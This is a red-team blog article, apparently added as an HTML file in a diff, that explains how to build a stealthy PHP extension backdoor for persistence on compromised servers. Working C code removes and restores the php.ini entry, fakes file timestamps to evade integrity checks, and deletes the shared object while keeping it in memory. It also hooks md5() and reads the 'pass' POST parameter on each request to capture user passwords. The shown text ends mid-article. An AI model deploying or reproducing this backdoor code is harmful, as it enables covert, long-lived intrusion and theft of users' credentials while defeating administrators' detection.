@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Improving PHP extensions as a persistence method | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Improving PHP extensions as a persistence method" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Article about how to build backdoors for the Zend Engine." />
+<meta property="og:description" content="Article about how to build backdoors for the Zend Engine." />
+<link rel="canonical" href="http://localhost:4000/posts/2018/07/28/PHP-extension-backdoor.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2018/07/28/PHP-extension-backdoor.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-07-28T14:00:10+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Improving PHP extensions as a persistence method" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2018-07-28T14:00:10+02:00","datePublished":"2018-07-28T14:00:10+02:00","description":"Article about how to build backdoors for the Zend Engine.","headline":"Improving PHP extensions as a persistence method","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2018/07/28/PHP-extension-backdoor.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2018/07/28/PHP-extension-backdoor.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>28 July 2018</small>
+<h1>Improving PHP extensions as a persistence method</h1>
+
+
+<p>        
+In our operations as Red Team we tend to use different persistence methods because every technique has his pros and his contras. The choice usually is based on the context, so in the case of a server situated in the perimeter a PHP extension is a great election. I made a introductory post about this old technique in <strong>Tarlogic’s Blog</strong> (<a href="https://www.tarlogic.com/en/blog/backdoors-php-extensions/">Backdoors in XAMP stack (part I): PHP extensions</a>). I recommend you to read first that post as a intro, because here we will not talk about basic topics like how to create and compile the extensions.</p>
+
+<p>        
+The takeaways from this article are:</p>
+<ul>
+  <li>How to reduce the tracks</li>
+  <li>Hooking PHP functions to extract useful info from a Red Team perspective</li>
+  <li>Interception of GET/POST parameters</li>
+</ul>
+
+<p><em>PS: the examples are tested in a PHP 7 environment (there are changes between PHP 5 and PHP 7 API internals)</em></p>
+<h2 id="0x00-introduction">0x00 Introduction</h2>
+<p>        
+As a fast recap (in a classic XAMP stack):</p>
+<ol>
+  <li>PHP interpreter will load our PHP extension at startup if it is added in his php.ini file (extension=path/to/our/extension)</li>
+  <li>In a PHP extension we are interested mainly in 4 <em>hooks</em>: MINIT &amp; MSHUTDOWN, and RINIT &amp; RSHUTDOWN. The M* are executed (usually) as root when the interpreter starts and stops. The R* are executed in every request as the server user.</li>
+  <li>We can read HTTP headers from a request and trigger any action (for example to execute a command or initiate a reverse shell).</li>
+</ol>
+
+<p>        
+To keep our acces to a compromised server a PHP extension is a really nice choice. We can interact with this kind of backdoors using a legitimate HTTP request (as seen in the recommended article), so firewalls and network rules can not detect us. Unfortunally, to load our extension we need to modify the php.ini file and reload gracefully the configuration. If the php.ini is not restored, the size, hash and timestamp will differ and the operation can be disclosed. Blue Team wins, we lose.</p>
+
+<p>        
+Of course the php.ini modifications should be detected inmediately by a file integrity checker… but in the reality SOCs tends to ignore this kind of alerts because usually are just noise made by an update or a sysadmin touching his systems.</p>
+
+<h2 id="0x01-this-phpini-was-not-modified">0x01 This php.ini was not modified</h2>
+<p>        
+Ok, an alert was generated when we modified the php.ini. Someone SSHs to the server, does a cat to the php.ini and do not see nothing. Does a ls, and the timestamp is fine. The server is restarted gracefully just to double-check that nothing weird happens. <strong>Our backdoor still alive</strong>. What is happening here?</p>
+
+<p>        
+When our PHP extension is loaded, we no need to keep the line “extesion=path/to/our.so” inside the php.ini file. We can retrieve it to his original status programatically. Taking advantage of the <strong>MINIT</strong> hook we can delete the line added to the php.ini, so when the extension is loaded this hook will be triggered as root (usually) and we can edit the php.ini file without problems.</p>
+
+<p>        
+In the same way, we can use <strong>MSHUTDOWN</strong> to insert a snippet of code destinated to add again the line to the php.ini, so when the server is restarted the line “extension=…” will be added again. The extension will be loaded, the MINIT is executed and the cicle is closed. Using this approach the php.ini file will not show anything weird the most part of the time. A generic function can be expressed like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// This code sucks</span>
+<span class="kt">int</span> <span class="nf">modifyExtension</span><span class="p">(</span><span class="kt">int</span> <span class="n">action</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">source</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">needle</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">newSize</span><span class="p">;</span>
+
+    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">PHPINI</span><span class="p">,</span> <span class="s">"a+"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">action</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">fseek</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0L</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="kt">long</span> <span class="n">bufsize</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span> <span class="c1">// FileSize</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">bufsize</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="n">source</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">bufsize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span> <span class="c1">// Alloc memory to read php.ini</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">fseek</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0L</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+                    <span class="n">free</span><span class="p">(</span><span class="n">source</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="n">newSize</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">bufsize</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">ferror</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+                    <span class="n">free</span><span class="p">(</span><span class="n">source</span><span class="p">);</span>
+                <span class="p">}</span>           
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="n">source</span><span class="p">[</span><span class="n">newSize</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+                    <span class="n">needle</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">LOCATION</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">needle</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="kt">FILE</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/tmp/.tmpini"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span>
+                        <span class="n">fwrite</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="p">(</span><span class="n">needle</span> <span class="o">-</span> <span class="n">source</span> <span class="o">-</span> <span class="mi">11</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span> <span class="c1">//11 = len("\nextension=kk.so")</span>
+                        <span class="n">fclose</span><span class="p">(</span><span class="n">tmp</span><span class="p">);</span>
+                        <span class="n">rename</span><span class="p">(</span><span class="s">"/tmp/.tmpini"</span><span class="p">,</span> <span class="n">PHPINI</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                <span class="n">free</span><span class="p">(</span><span class="n">source</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">action</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">fwrite</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">extension="</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+            <span class="n">fwrite</span><span class="p">(</span><span class="n">LOCATION</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">LOCATION</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+            <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Extension added to PHP.INI</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>        
+The counterpart of this tactic is that if the server is killed in an unexpected way, the MSHUTDOWN hook will not be executed. In the other hand, the timestamp will be modified, so we need to keep that in mind too:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define PHPINI "/u/know/that/php.ini"
+</span><span class="p">...</span>
+<span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
+<span class="n">stat</span><span class="p">(</span><span class="n">PHPINI</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
+<span class="p">...</span><span class="c1">// Do changes</span>
+<span class="n">new_time</span><span class="p">.</span><span class="n">actime</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_atime</span><span class="p">;</span>
+<span class="n">new_time</span><span class="p">.</span><span class="n">modtime</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_mtime</span><span class="p">;</span>
+<span class="n">utime</span><span class="p">(</span><span class="n">PHPINI</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_time</span><span class="p">);</span>
+</code></pre></div></div>
+<p>        
+Restoring the timestamp is always a cool trick.</p>
+
+<h2 id="0x02-bring-me-from-memory">0x02 Bring me from memory</h2>
+<p>        
+We saw how to restore the php.ini, but we need to delete and restore the backdoor itself (the shared object) because we are working at userland level (if we use a rootkit -a simple LKM for example- we can hide it without problems). At the moment that our extension is loaded, we can save its content in memory easily, then delete the file. Something like:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Simple PoC</span>
+<span class="n">PHP_MINIT_FUNCTION</span><span class="p">(</span><span class="n">PoC</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">//Executed when the module is loaded</span>
+    <span class="c1">// Privilege: root (usually)</span>
+
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">check</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">utimbuf</span> <span class="n">new_time</span><span class="p">;</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] LOADED</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="c1">//1) Calculate size of the file</span>
+    <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">LOCATION</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">SUCCESS</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">filesize</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
+
+    <span class="c1">//2) Open the file </span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">LOCATION</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">SUCCESS</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//3) Map file to memory</span>
+    <span class="n">mapedFile</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">filesize</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+    
+    <span class="c1">//4) Delete file</span>
+    <span class="n">remove</span><span class="p">(</span><span class="n">LOCATION</span><span class="p">);</span>
+    
+    <span class="c1">//5) Get timestamp</span>
+    <span class="n">stat</span><span class="p">(</span><span class="n">PHPINI</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
+
+    <span class="c1">//6) Modify php.ini and delete the extension line</span>
+    <span class="n">check</span> <span class="o">=</span> <span class="n">modifyExtension</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">check</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] PHP.INI could not be edited</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] PHP.INI edited</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">//7) Fake timestamp</span>
+    <span class="n">new_time</span><span class="p">.</span><span class="n">actime</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_atime</span><span class="p">;</span>
+    <span class="n">new_time</span><span class="p">.</span><span class="n">modtime</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_mtime</span><span class="p">;</span>
+    <span class="n">utime</span><span class="p">(</span><span class="n">PHPINI</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_time</span><span class="p">);</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>        
+The next step is to use the MSHUTDOWN hook to write the shared object from memory to a file:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PHP_MSHUTDOWN_FUNCTION</span><span class="p">(</span><span class="n">Allocer</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// We write the file again, edit php.ini and fake the timestamp</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mapedFile</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">SUCCESS</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kt">int</span> <span class="n">check</span><span class="p">;</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">utimbuf</span> <span class="n">new_time</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
+
+    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">LOCATION</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span>
+    <span class="n">fwrite</span><span class="p">(</span><span class="n">mapedFile</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">filesize</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+    <span class="n">munmap</span><span class="p">(</span><span class="n">mapedFile</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span>
+    <span class="n">stat</span><span class="p">(</span><span class="n">PHPINI</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
+    <span class="n">new_time</span><span class="p">.</span><span class="n">actime</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_atime</span><span class="p">;</span>
+    <span class="n">new_time</span><span class="p">.</span><span class="n">modtime</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_mtime</span><span class="p">;</span>    
+    
+    <span class="n">check</span> <span class="o">=</span> <span class="n">modifyExtension</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">utime</span><span class="p">(</span><span class="n">PHPINI</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_time</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">SUCCESS</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="0x03-hooked-on-a-feeling">0x03 Hooked on a feeling</h2>
+
+<p>        
+We know now how to leave the minimum tracks and in my post at Tarlogic’s blog was explained how to communicate with our backdoor and trigger actions via HTTP headers, so lets move to more interesting things like hooking.</p>
+
+<p>        
+As ReadTeamers we are eager for hunting credentials that help us in the lateral movement. If we can place a hook in well-known functions (like the ones used to hash passwords or the used to insert new users in the database) we can retrieve critical info that can be exfiltrated vía DNS (as shown in this post “<a href="https://x-c3ll.github.io/posts/PAM-backdoor-DNS/">Exfiltrating credentials via PAM backdoors &amp; DNS requests</a>”). As a simple PoC, we are going to hook the PHP function md5(). Lets dive deep inside PHP internals!</p>
+
+<p>        
+The function symbol table is stored as  a <a href="http://www.phpinternalsbook.com/hashtables.html">HashTable</a> inside the structure <a href="https://phpinternals.net/docs/zend_compiler_globals">zend_compiler_globals</a>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_zend_compiler_globals</span> <span class="p">{</span>
+    <span class="n">zend_stack</span> <span class="n">loop_var_stack</span><span class="p">;</span>
+
+    <span class="n">zend_class_entry</span> <span class="o">*</span><span class="n">active_class_entry</span><span class="p">;</span>
+
+    <span class="n">zend_string</span> <span class="o">*</span><span class="n">compiled_filename</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">zend_lineno</span><span class="p">;</span>
+
+    <span class="n">zend_op_array</span> <span class="o">*</span><span class="n">active_op_array</span><span class="p">;</span>
+
+    <span class="n">HashTable</span> <span class="o">*</span><span class="n">function_table</span><span class="p">;</span>  <span class="cm">/* function symbol table */</span>
+<span class="p">...</span>
+</code></pre></div></div>
+<p>        
+We can access to the function_table member vía the CG (<em>Compiler Global</em>) macro and search for the address of a function. As it is a HashTable, we can use <a href="https://phpinternals.net/docs/zend_hash_str_find_ptr">zend_hash_str_find_ptr</a> to search for the key “md5”. Lastly, we only need to modify the handler (that points to the address of the function) to make it point to our hook. Something like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Placed at MINIT</span>
+	<span class="p">...</span>
+    <span class="n">zend_function</span> <span class="o">*</span><span class="n">orig</span><span class="p">;</span>
+    <span class="n">orig</span> <span class="o">=</span> <span class="n">zend_hash_str_find_ptr</span><span class="p">(</span><span class="n">CG</span><span class="p">(</span><span class="n">function_table</span><span class="p">),</span> <span class="s">"md5"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"md5"</span><span class="p">));</span>
+    <span class="n">orig</span><span class="o">-&gt;</span><span class="n">internal_function</span><span class="p">.</span><span class="n">handler</span> <span class="o">=</span> <span class="n">zif_md5_hook</span><span class="p">;</span>
+    <span class="p">...</span>
+</code></pre></div></div>
+<p>        
+Check the original <a href="https://github.com/php/php-src/blob/master/ext/standard/md5.c">md5 function code</a>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PHP_NAMED_FUNCTION</span><span class="p">(</span><span class="n">php_if_md5</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">zend_string</span> <span class="o">*</span><span class="n">arg</span><span class="p">;</span>
+	<span class="n">zend_bool</span> <span class="n">raw_output</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">PHP_MD5_CTX</span> <span class="n">context</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">digest</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+
+	<span class="n">ZEND_PARSE_PARAMETERS_START</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+		<span class="n">Z_PARAM_STR</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>
+		<span class="n">Z_PARAM_OPTIONAL</span>
+		<span class="n">Z_PARAM_BOOL</span><span class="p">(</span><span class="n">raw_output</span><span class="p">)</span>
+<span class="n">ZEND_PARSE_PARAMETERS_END</span><span class="p">();</span>
+<span class="p">...</span>
+
+</code></pre></div></div>
+<p>        
+To create our hook first we need to define it with the correct data type and args. In the offical <a href="http://php.net/manual/es/internals2.funcs.php">documentation</a> appears that PHP_NAMED_FUNCTION(whatever) expands to <code class="language-plaintext highlighter-rouge">void zif_whatever(INTERNAL_FUNCTION_PARAMETERS)</code>. So our hook must be created like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Test Hook md5</span>
+<span class="kt">void</span> <span class="nf">zif_md5_hook</span><span class="p">(</span><span class="n">INTERNAL_FUNCTION_PARAMETERS</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">php_printf</span><span class="p">(</span><span class="s">"[+] Hook called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">zend_string</span> <span class="o">*</span><span class="n">arg</span><span class="p">;</span>
+    <span class="n">zend_bool</span> <span class="n">raw_output</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ZEND_PARSE_PARAMETERS_START</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+        <span class="n">Z_PARAM_STR</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>
+        <span class="n">Z_PARAM_OPTIONAL</span>
+        <span class="n">Z_PARAM_BOOL</span><span class="p">(</span><span class="n">raw_output</span><span class="p">)</span>
+	<span class="n">ZEND_PARSE_PARAMETERS_END</span><span class="p">();</span>
+    <span class="n">php_printf</span><span class="p">(</span><span class="s">"[+] MD5 Called with parameter: %s"</span><span class="p">,</span> <span class="n">ZSTR_VAL</span><span class="p">(</span><span class="n">arg</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>        
+Compile and execute:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mothra@arcadia:~/php-7.2.8/ext/Allocer| 
+⇒  sudo /usr/local/bin/php  -r "echo md5('kk');"
+[+] LOADED
+[+] PHP.INI edited
+[+] Hook called
+[+] MD5 Called with parameter: kk%
+</code></pre></div></div>
+<p>        
+Perfect! The way to call the original md5 after our arbitrary code is executed is left as an exercise to the reader. It is easy to do, as we have the reference to the original address before we modified it <strong>:P</strong></p>
+
+<h2 id="0x04-sniffing-parameteres-getpost">0x04 Sniffing parameteres (GET/POST)</h2>
+<p>        
+Hooking juicy functions is a nice way to retrieve info, but if we know the existence of cool parameters sent via POST or GET (for example the login form) is far better to hunt those values. We are going to place our code inside the <strong>RINIT</strong> hook because it is executed every time a request is processed. In order to retrieve the information we need to check how PHP engine does it at <a href="https://github.com/php/php-src/blob/master/main/php_variables.c">php_variables.c</a>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+<span class="n">zval_ptr_dtor_nogc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_POST</span><span class="p">]);</span>
+<span class="n">ZVAL_COPY_VALUE</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_POST</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">);</span>
+<span class="p">...</span>
+</code></pre></div></div>
+<p>        
+So the variables are taken as an array from http_globals. The easiest way to search for a particular value (for example we want to exfiltrate the “pass” parameter sent in a login form) is to fetch a HashTable from the array and then use the API to search as we did before to search for the md5 function. Our magic function to do this is <a href="https://phpinternals.net/docs/hash_of">HASH_OF</a>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">zval</span> <span class="o">*</span><span class="n">password</span><span class="p">;</span>
+	<span class="n">zval</span> <span class="o">*</span><span class="n">post_arr</span><span class="p">;</span>
+	<span class="n">HashTable</span> <span class="o">*</span><span class="n">post_hash</span><span class="p">;</span>
+	<span class="n">post_arr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_POST</span><span class="p">];</span> <span class="c1">//Array</span>
+	<span class="n">post_hash</span> <span class="o">=</span> <span class="n">HASH_OF</span><span class="p">(</span><span class="n">post_arr</span><span class="p">);</span>
+
+	<span class="n">password</span> <span class="o">=</span> <span class="n">zend_hash_str_find</span><span class="p">(</span><span class="n">post_hash</span><span class="p">,</span> <span class="s">"pass"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"pass"</span><span class="p">));</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">password</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">php_printf</span><span class="p">(</span><span class="s">"Password: %s"</span><span class="p">,</span> <span class="n">Z_STRVAL_P</span><span class="p">(</span><span class="n">password</span><span class="p">));</span>
+	<span class="p">}</span>
+
+</code></pre></div></div>
+<p>        
+If we test it:</p>
+
